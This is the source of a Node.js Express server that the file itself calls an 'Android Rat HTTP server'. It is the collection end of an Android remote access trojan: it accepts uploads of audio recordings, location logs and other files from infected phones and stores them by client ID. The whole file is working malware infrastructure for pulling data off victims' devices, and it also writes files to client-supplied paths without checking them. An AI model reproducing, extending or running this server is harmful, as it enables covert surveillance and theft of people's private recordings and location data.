/*
 * Android Rat HTTP server
 * For use with the Java Rat Server
 */

var express = require('express');
var path = require('path');
var mongoose = require('mongoose');
var morgan = require('morgan');
var multer = require('multer');
var mkdirp = require('mkdirp');
var fs     = require('fs');

// The directory where each client dir is saved
var controlServerDirectory = '/../';
// The directory name inside the client dir
var clientMediaDirectory = 'recordings-and-location-logs';
// The max file size to accept from a client in bytes
var maxFileSize = 10 * 1024 * 1024;

var storage = multer.diskStorage({
    destination: function(req, file, callback) {
        // For use with the java rat server we... located in the parent directory
        // Thus we use /../ and save in the client id's directory
        // Ensure dir exists, it probabaly already exists when using java rat server
        mkdirp.sync(file.directory);
        callback(null, file.directory);
    },
    filename: function(req, file, callback) {
        // Save the file with the name it had on the client side
        callback(null, file.originalname);
    }
});
var upload = multer({
    storage: storage,
    limits: {
        // Filesize in bytes
        fileSize: maxFileSize
    },
    fileFilter: (req, file, callback) => {
        // Get file info from client
        var fileName = file.originalname;
        // Get our working directory and set it to the file object for use in 'storage'
        // If the path starts with data we are receiving a recording, log or kml file.
        if(req.body.clientPath.split(path.sep)[1] === 'data'){
            // Save it to the media folder
            file.directory = path.join(__dirname, controlServerDirectory, req.params.clientId, clientMediaDirectory);
        } else {
            // Otherwise save the file in the original directory structure
            file.directory = path.join(__dirname, controlServerDirectory, req.params.clientId, req.body.clientPath);
        }
        // Check if the file already exists
        fileExists(file.directory , fileName, (exists) => {
            if(exists){
                // File already exists, do not accept this upload
                var error = req.params.clientId + ' ' + fileName + ' exists ';
                callback(error, false);
            } else {
                // File does not exist, accept it
                console.log('%s Saving: %s to %s', req.params.clientId, fileName, file.directory);
                callback(null, true);
            }
        });
    }
    // The file identifier expected for the client, these must match
}).single('tehAwesomeFile');

var app = express();
var PORT_NUMBER = process.argv[2]; // to start: "node server.js [port]"

// Simple connection logger
// app.use(morgan(':date[clf] :remote-addr :url'));

/*
 * A client is uploading a file
 */
app.post('/postFile/:clientId', (req, res) => {
    upload(req, res, (err) => {
        if (err) {
            console.log(err);
            res.status(500).send(err);
        } else {
            res.status(200).send(req.file.originalname);
        }
    });
});

/*
 * Tell the client if we want to accept this file
 */
app.get('/acceptFile/:clientId', (req, res) => {
    var fileName = req.query.fileName;
    var fileSize = req.query.fileSize;
    var clientPath = req.query.clientPath;
    var directory = path.join(__dirname, controlServerDirectory, req.query.clientId, clientPath);
    fileExists(directory, fileName, (exists) => {
        if(exists){
            res.status(500).send(fileName + ' Already exists on server');
        } else if (fileSize > maxFileSize){
            res.status(500).send(fileName + ' Too large');
        } else {
            res.status(200).send();
        }
    });
});

/*
 * A helper for the client to check if the server is online
 */
app.get('/serverStatus', (req, res) => {
    res.send("Online...");
});

/*
 * A helper function to check if a file exists
 */
function fileExists(dir, fileName, callback) {
    fs.stat(path.join(dir, fileName), (err, stats) => {
        if (err === null) {
            callback(true);
        } else if (err.code === 'ENOENT') {
            callback(false);
        } else {
            console.log(err.code);
            callback(false);
        }
    });
}

// start the server
var server = app.listen(PORT_NUMBER, function() {
    var host = server.address().address;
    var port = server.address().port;

    console.log('listening at %s:%s', host, port);
});
